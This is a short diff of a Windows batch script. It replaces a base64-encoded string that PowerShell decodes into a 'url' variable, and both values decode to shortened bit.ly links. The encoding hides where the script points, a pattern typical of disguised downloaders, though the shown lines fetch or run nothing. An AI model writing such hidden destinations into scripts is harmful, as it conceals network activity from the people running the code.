@@ -15,7 +15,7 @@ echo.
 
 pause
 
-powershell [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9iaXQubHkvMlptcHJFQg==')) > output
+powershell [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9iaXQubHkvM3ZCQTZhZA==')) > output
 
 set /p url=<output
 
